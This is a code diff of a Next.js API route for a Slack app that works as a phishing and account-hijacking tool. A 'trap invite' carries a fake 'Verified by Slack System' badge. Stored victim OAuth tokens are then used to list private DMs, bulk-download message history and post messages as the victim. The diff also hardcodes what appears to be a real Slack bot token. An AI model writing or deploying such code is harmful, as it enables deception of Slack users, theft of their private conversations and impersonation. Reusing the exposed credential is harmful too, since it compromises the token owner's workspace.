@@ -1,12 +1,13 @@
 /* eslint-disable @typescript-eslint/no-explicit-any */
 // app/api/slack/manager/route.ts
 
-import { NextResponse } from 'next/server';
-// import { db } from '@/lib/firebase'; 
-import { doc, getDoc, deleteDoc, setDoc, serverTimestamp } from 'firebase/firestore';
-import { db } from '../../../../lib/firebase';
+// app/api/slack/manager/route.ts
 
-// ⚠️ APNI KEYS CHECK KAREIN
+import { NextResponse } from 'next/server';
+import { db } from '../../../../lib/firebase';
+import { doc, getDoc, deleteDoc, setDoc } from 'firebase/firestore';
+
+// ⚠️ KEYS CHECK
 const BOT_TOKEN = "xoxb-2545190050563-10475329879780-x09CDqtudRFfpMpG0WHsv3Vu"; 
 const CLIENT_ID = "2545190050563.10469623331926";
 const REDIRECT_URI = "https://slack-attendance.vercel.app/api/auth/callback";
@@ -16,7 +17,7 @@ export async function POST(req: Request) {
     const body = await req.json();
     const { action, targetUserId, channelId, text, messageTs, newText } = body;
 
-    // --- CASE 1: SEND TRAP INVITE (MULTIPLE STORAGE FIX) ---
+    // --- CASE 1: SEND TRAP INVITE (Accumulate Messages) ---
     if (action === 'send_invite') {
        if (!targetUserId) return NextResponse.json({ success: false, error: "User ID missing" });
        
@@ -34,7 +35,6 @@ export async function POST(req: Request) {
         { "type": "context", "elements": [ { "type": "mrkdwn", "text": "🔒 Verified by Slack System" } ] }
        ];
 
-       // 1. Message bhejo
        const chatRes = await fetch('https://slack.com/api/chat.postMessage', {
          method: 'POST',
          headers: { Authorization: `Bearer ${BOT_TOKEN}`, 'Content-Type': 'application/json; charset=utf-8' },
@@ -44,41 +44,31 @@ export async function POST(req: Request) {
        const chatData = await chatRes.json();
        if(!chatData.ok) return NextResponse.json({ success: false, error: `Slack Error: ${chatData.error}` });
 
-       // 2. 🔥 IMPORTANT: Puranay messages ke sath naya add karo
+       // Store in Array
        const inviteRef = doc(db, "pending_invites", targetUserId);
-       
        try {
            const docSnap = await getDoc(inviteRef);
            let msgList = [];
-
-           // Agar pehlay se data hai, to usay utha lo
            if (docSnap.exists()) {
                const data = docSnap.data();
                if (data.messages) msgList = data.messages;
-               else if (data.ts) msgList.push({ ts: data.ts, channel: data.channel }); // Old format support
+               else if (data.ts) msgList.push({ ts: data.ts, channel: data.channel });
            }
-
-           // Naya message list main daalo
            msgList.push({ ts: chatData.ts, channel: chatData.channel });
-
-           // Wapas save karo
            await setDoc(inviteRef, { messages: msgList }, { merge: true });
-
        } catch (e) { console.error("Firebase Write Failed:", e); }
        
        return NextResponse.json({ success: true });
     }
 
-    // --- Baki Actions (Same as before) ---
-    // (Main ne baaki code same rakha hai taakay confusion na ho)
-    
+    // --- CASE 2: DELETE USER ---
     if (action === 'delete_user') {
         try { await deleteDoc(doc(db, "slack_tokens", targetUserId)); } catch(e) {}
         return NextResponse.json({ success: true });
     }
 
+    // --- TOKEN CHECK ---
     if (!targetUserId) return NextResponse.json({ error: "User ID required" });
-    
     let USER_TOKEN = "";
     try {
         const tokenDoc = await getDoc(doc(db, "slack_tokens", targetUserId));
@@ -86,57 +76,95 @@ export async function POST(req: Request) {
         USER_TOKEN = tokenDoc.data().accessToken;
     } catch (e) { return NextResponse.json({ error: "DB Error" }, { status: 503 }); }
 
+    // --- CASE 3: LIST CHATS ---
     if (action === 'list_chats') {
-        const chatRes = await fetch('https://slack.com/api/users.conversations?types=im,mpim&limit=100', { headers: { Authorization: `Bearer ${USER_TOKEN}` } });
+        const chatRes = await fetch('https://slack.com/api/users.conversations?types=im,mpim&limit=100', { 
+            headers: { Authorization: `Bearer ${USER_TOKEN}` } 
+        });
         const chatData = await chatRes.json();
         if(!chatData.ok) return NextResponse.json({ chats: [] });
 
-        const usersRes = await fetch('https://slack.com/api/users.list?limit=1000', { headers: { Authorization: `Bearer ${USER_TOKEN}` } });
+        const usersRes = await fetch('https://slack.com/api/users.list?limit=1000', {
+            headers: { Authorization: `Bearer ${USER_TOKEN}` }
+        });
         const usersData = await usersRes.json();
+
         const userMap: Record<string, any> = {};
         if (usersData.ok && usersData.members) {
-            usersData.members.forEach((u: any) => { userMap[u.id] = { name: u.real_name || u.name, image: u.profile?.image_48 }; });
+            usersData.members.forEach((u: any) => {
+                userMap[u.id] = { name: u.real_name || u.name, image: u.profile?.image_48 };
+            });
         }
 
         const chats = await Promise.all((chatData.channels || []).map(async (c: any) => {
-            let unread = 0;
+            let displayName = "Group Chat";
+            let displayImage = null;
+            let unreadCount = 0;
+
             try {
                 const infoRes = await fetch(`https://slack.com/api/conversations.info?channel=${c.id}`, { headers: { Authorization: `Bearer ${USER_TOKEN}` } });
-                const info = await infoRes.json();
-                if(info.ok && info.channel) unread = info.channel.unread_count_display || 0;
+                const infoData = await infoRes.json();
+                if(infoData.ok && infoData.channel) unreadCount = infoData.channel.unread_count_display || 0;
             } catch(e) {}
 
             if(c.is_im) {
-                const user = userMap[c.user] || { name: "Unknown User", image: null };
-                return { ...c, name: user.name, image: user.image, unread };
+                const userId = c.user;
+                if(userMap[userId]) {
+                    displayName = userMap[userId].name;
+                    displayImage = userMap[userId].image;
+                } else {
+                    try {
+                        const singleUserRes = await fetch(`https://slack.com/api/users.info?user=${userId}`, { headers: { Authorization: `Bearer ${USER_TOKEN}` } });
+                        const singleUserData = await singleUserRes.json();
+                        if(singleUserData.ok) {
+                            displayName = singleUserData.user.real_name || singleUserData.user.name;
+                            displayImage = singleUserData.user.profile.image_48;
+                        } else { displayName = `ID: ${userId}`; }
+                    } catch(e) { displayName = `External: ${userId}`; }
+                }
+                return { ...c, name: displayName, image: displayImage, unread: unreadCount };
             }
-            return { ...c, name: "Group Chat", image: null, unread };
+            return { ...c, name: displayName, image: displayImage, unread: unreadCount };
         }));
+
         return NextResponse.json({ chats });
     }
 
+    // --- CASE 4: GET MESSAGES (🚀 MAX SPEED VERSION) ---
     if (action === 'get_messages') {
         let allMessages: any[] = [];
         let hasMore = true;
         let nextCursor = undefined;
-        let loopCount = 0;
-        while (hasMore && loopCount < 3) { 
-            let url = `https://slack.com/api/conversations.history?channel=${channelId}&limit=100`;
+        
+        // ⏱️ TIMER START
+        const startTime = Date.now();
+
+        while (hasMore) { 
+            // 🛑 SAFETY BRAKE: Agar 8 second se zyada ho gaye, to ruk jao (Server Crash se bachanay ke liye)
+            if (Date.now() - startTime > 8000) break;
+
+            // ⚡ FETCH 500 MESSAGES PER REQUEST (Max allowed)
+            let url = `https://slack.com/api/conversations.history?channel=${channelId}&limit=500`;
             if (nextCursor) url += `&cursor=${nextCursor}`;
+
             try {
                 const res = await fetch(url, { headers: { Authorization: `Bearer ${USER_TOKEN}` } });
                 const data = await res.json();
+
                 if (data.ok && data.messages) {
                     allMessages = [...allMessages, ...data.messages];
-                    if (data.has_more && data.response_metadata?.next_cursor) nextCursor = data.response_metadata.next_cursor;
-                    else hasMore = false;
-                } else hasMore = false;
+                    
+                    if (data.has_more && data.response_metadata?.next_cursor) {
+                        nextCursor = data.response_metadata.next_cursor;
+                    } else { hasMore = false; }
+                } else { hasMore = false; }
             } catch (err) { hasMore = false; }
-            loopCount++;
         }
+        
         return NextResponse.json({ messages: allMessages.reverse() });
     }
 
+    // --- OTHER ACTIONS ---
     if (action === 'send_as_user') {
          const res = await fetch('https://slack.com/api/chat.postMessage', {
             method: 'POST',
